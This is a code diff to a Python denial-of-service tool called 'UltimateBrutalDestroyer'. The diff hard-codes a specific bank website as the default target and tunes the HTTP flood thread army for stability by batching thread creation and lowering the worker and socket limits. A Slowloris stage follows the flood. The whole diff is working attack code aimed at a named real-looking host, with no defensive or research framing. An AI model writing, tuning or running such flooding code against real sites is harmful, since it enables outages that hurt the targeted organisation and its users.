@@ -37,18 +37,18 @@ if platform.system() == 'Windows':
 logging.getLogger('asyncio').setLevel(logging.CRITICAL)
 
 class UltimateBrutalDestroyer:
-    def __init__(self, target_url="url"):
+    def __init__(self, target_url="https://iibss.iraqiislamicb.iq/web/"):
         self.target_url = target_url
         self.successful_requests = 0
         self.failed_requests = 0
         self.lock = threading.Lock()
         self.running = True
         
-        # System resources
+        # System resources - Reduced to half for Windows stability
         self.cpu_count = multiprocessing.cpu_count()
-        self.max_workers = self.cpu_count * 500  # 500 workers per CPU core
-        self.max_sockets = 10000
-        self.max_async_tasks = 5000
+        self.max_workers = self.cpu_count * 250  # Reduced from 500 to 250 workers per CPU core
+        self.max_sockets = 5000  # Reduced from 10000 to 5000
+        self.max_async_tasks = 2500  # Reduced from 5000 to 2500
         
         # Parse URL
         self.parsed_url = urlparse(target_url)
@@ -372,10 +372,19 @@ class UltimateBrutalDestroyer:
         
         # 1. Multi-threaded HTTP attacks
         print("🚀 Starting HTTP thread army...")
-        for i in range(min(self.max_workers, 2000)):  # Limit to prevent system crash
-            thread = threading.Thread(target=self.brutal_http_worker, args=(i,), daemon=True)
-            thread.start()
-            threads.append(thread)
+        thread_batch_size = 100  # Create threads in batches
+        for batch in range(0, min(self.max_workers, 1000), thread_batch_size):  # Reduced from 2000 to 1000
+            batch_end = min(batch + thread_batch_size, min(self.max_workers, 1000))
+            for i in range(batch, batch_end):
+                thread = threading.Thread(target=self.brutal_http_worker, args=(i,), daemon=True)
+                thread.start()
+                threads.append(thread)
+            
+            # Small delay between batches
+            time.sleep(0.05)
+            print(f"   Created {len(threads)} threads...")
+        
+        print(f"✅ HTTP thread army complete: {len(threads)} threads")
         
         # 2. Slowloris attack
         print("🐌 Starting Slowloris destroyer...")
